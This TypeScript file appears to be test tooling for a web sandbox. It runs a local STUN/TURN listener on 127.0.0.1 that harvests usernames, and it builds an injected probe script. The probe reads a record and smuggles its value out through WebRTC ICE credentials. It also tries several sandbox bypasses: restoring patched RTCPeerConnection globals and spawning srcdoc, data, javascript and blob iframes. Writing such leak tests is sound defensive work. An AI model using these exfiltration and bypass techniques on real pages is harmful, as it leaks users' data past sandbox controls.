import { randomBytes } from 'node:crypto';
import { createSocket } from 'node:dgram';

/** A local ICE server records packets and challenges TURN allocations to expose their usernames */
export async function captureIce() {
  const socket = createSocket('udp4');
  const packets: Buffer[] = [];
  const usernames: string[] = [];
  const attribute = (type: number, value: Buffer) => {
    const result = Buffer.alloc(4 + Math.ceil(value.length / 4) * 4);
    result.writeUInt16BE(type, 0);
    result.writeUInt16BE(value.length, 2);
    value.copy(result, 4);
    return result;
  };
  const challenge = Buffer.concat([
    attribute(0x0009, Buffer.from([0, 0, 4, 1])),
    attribute(0x0014, Buffer.from(randomBytes(12).toString('hex'))),
    attribute(0x0015, Buffer.from(randomBytes(12).toString('hex'))),
  ]);
  socket.on('message', (packet, remote) => {
    packets.push(packet);
    if (packet.length < 20 || packet.readUInt32BE(4) !== 0x2112a442) return;
    for (let offset = 20; offset + 4 <= packet.length;) {
      const length = packet.readUInt16BE(offset + 2);
      if (offset + 4 + length > packet.length) return;
      if (packet.readUInt16BE(offset) === 0x0006)
        usernames.push(packet.subarray(offset + 4, offset + 4 + length).toString());
      offset += 4 + Math.ceil(length / 4) * 4;
    }
    if (packet.readUInt16BE(0) !== 0x0003) return;
    const header = Buffer.from(packet.subarray(0, 20));
    header.writeUInt16BE(0x0113, 0);
    header.writeUInt16BE(challenge.length, 2);
    socket.send(Buffer.concat([header, challenge]), remote.port, remote.address);
  });
  await new Promise<void>((resolve, reject) => {
    socket.once('error', reject);
    socket.bind(0, '127.0.0.1', resolve);
  });
  const address = socket.address();
  return {
    packets,
    usernames,
    urls: [
      `stun:${address.address}:${address.port}`,
      `turn:${address.address}:${address.port}?transport=udp`,
    ],
    close: () => new Promise<void>((resolve) => socket.close(() => resolve())),
  };
}

/** Runs as custom source, after reading a synthetic record through the ordinary page bridge */
export function iceProbe(urls: string[], fieldId: string, credential: string) {
  return `
(async () => {
  const result = await rio.records('records01')
  const value = result.rows[0].values[${JSON.stringify(fieldId)}]
  document.body.dataset.record = value
  const iceServers = [{ urls: ${JSON.stringify(urls)}, username: value, credential: ${JSON.stringify(credential)} }]
  const activity = { attempts: 0, connections: 0, gathering: 0, candidates: 0 }
  const attempt = async (realm, activity = { attempts: 0, connections: 0, gathering: 0, candidates: 0 }) => {
    for (const name of ['RTCPeerConnection', 'webkitRTCPeerConnection', 'mozRTCPeerConnection']) {
      activity.attempts++
      try {
        const peer = new realm[name]({ iceServers })
        activity.connections++
        peer.addEventListener('icegatheringstatechange', () => { activity.gathering++ })
        peer.addEventListener('icecandidate', (event) => { if (event.candidate) activity.candidates++ })
        peer.createDataChannel(value)
        await peer.setLocalDescription(await peer.createOffer())
      } catch {}
    }
  }
  await attempt(window, activity)
  for (const name of ['RTCPeerConnection', 'webkitRTCPeerConnection', 'mozRTCPeerConnection']) {
    try { delete window[name] } catch {}
    try { Object.defineProperty(window, name, { value: Object.getPrototypeOf(window)[name] }) } catch {}
  }
  await attempt(window, activity)
  const source = 'const iceServers = ' + JSON.stringify(iceServers)
    + '\\nconst value = ' + JSON.stringify(value) + '\\nvoid (' + attempt.toString() + ')(window)'
  const html = '<script>' + source + '<' + '/script>'
  for (const kind of ['blank', 'srcdoc', 'data', 'javascript', 'blob']) {
    const child = document.createElement('iframe')
    if (kind === 'srcdoc') child.srcdoc = html
    if (kind === 'data') child.src = 'data:text/html,' + encodeURIComponent(html)
    if (kind === 'javascript') child.src = 'javascript:' + source
    if (kind === 'blob') child.src = URL.createObjectURL(new Blob([html], { type: 'text/html' }))
    document.body.append(child)
    await attempt(child.contentWindow, activity)
    try { child.contentWindow.document.write(html) } catch {}
  }
  parent.postMessage({ type: 'interface-code-probed', value, activity }, '*')
  location.href = URL.createObjectURL(new Blob([html], { type: 'text/html' }))
})()
`;
}
